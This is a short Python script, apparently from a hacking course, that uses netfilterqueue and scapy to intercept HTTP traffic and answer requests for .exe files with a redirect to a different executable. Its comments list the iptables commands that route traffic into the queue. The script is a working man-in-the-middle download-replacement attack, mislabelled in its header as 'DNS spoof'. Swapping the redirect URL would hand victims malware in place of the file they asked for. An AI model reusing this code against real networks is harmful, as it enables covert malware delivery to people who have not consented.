#!/usr/bin/env python
#basic code of DNS spoof
#iptables -I OUTPUT -j NFQUEUE --queue-num 0
#iptables -I INPUT -j NFQUEUE --queue-num 0
#at last execute ---- iptable --flush
# different module---10th module...91 chapter
import netfilterqueue
import scapy.all as scapy
from scapy.layers import http

ack_list = []

def set_load(packet, load):
	packet[scapy.Raw].load = load
	del packet[scapy.IP].len
	del packet[scapy.IP].chksum
	del packet[scapy.TCP].chksum
	return packet


def process_packet(packet):
	scapy_packet = scapy.IP(packet.get_payload())
	if scapy_packet.haslayer(scapy.Raw):
		if scapy_packet[scapy.TCP].dport == 80:
			if ".exe" in scapy_packet[scapy.Raw].load and "10.0.2.15" not in scapy_packet[scapy.Raw].load: 
				print("[+] exe Request")
				ack_list.append(scapy_packet[scapy.TCP].ack)	
		elif scapy_packet[scapy.TCP].sport == 10000:
			if scapy_packet[scapy.TCP].seq in ack_list:
				ack_list.remove(scapy_packet[scapy.TCP].seq)
				print("[+] Replacing File. ")
				modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: https://www.rarlab.com/rar/wrar591.exe\n\n")
				packet.set_payload(str(modified_packet)) #
		
	packet.accept()



queue = netfilterqueue.NetfilterQueue()
queue.bind(12, process_packet)  
queue.run()


